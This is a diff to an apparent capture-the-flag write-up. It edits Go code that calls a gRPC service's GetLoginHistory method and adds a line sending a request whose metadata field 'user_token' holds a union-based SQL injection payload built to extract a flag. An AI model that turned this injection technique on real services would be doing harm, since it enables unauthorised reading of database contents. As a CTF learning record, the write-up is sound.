@@ -52,22 +52,22 @@ exists, without validation.
 
 ```go
 func main() {
-	conn, err := grpc.Dial("light.w-va.cf:1004", grpc.WithInsecure())
-	if err != nil {
-		panic(err)
-	}
-	defer conn.Close()
-	srvc := proto.NewSrvClient(conn)
-	srvreq := proto.SrvRequest{}
-	srvresp, err := srvc.GetLoginHistory(context.Background(), &srvreq)
-	if err != nil {
-		panic(err)
-	}
-	fmt.Println(srvresp)
+  conn, err := grpc.Dial("light.w-va.cf:1004", grpc.WithInsecure())
+  if err != nil {
+    panic(err)
+  }
+  defer conn.Close()
+  srvc := proto.NewSrvClient(conn)
+  srvreq := proto.SrvRequest{}
+  srvresp, err := srvc.GetLoginHistory(context.Background(), &srvreq)
+  if err != nil {
+    panic(err)
+  }
+  fmt.Println(srvresp)
 }
 ```
 
-It took me a bit more effort to figure out how to pass a `user_token` into the
+This got the Nil response. It took me a bit more effort to figure out how to pass a `user_token` into the
 `md` via the `metadata.FromIncomingContext(ctx)`. And from there,
 a union-based sql injection to get the flag.
 
@@ -76,6 +76,7 @@ a union-based sql injection to get the flag.
   md := metadata.New(map[string]string{"user_token": "')) union select flag from flags--"})
   ctx := metadata.NewOutgoingContext(context.Background(), md)
   srvreq := proto.SrvRequest{}
+  srvresp, err := srvc.GetLoginHistory(ctx, &srvreq)
 ```
 
 It was cool to learn about grpc and xorm as well--haven't done serious golang in
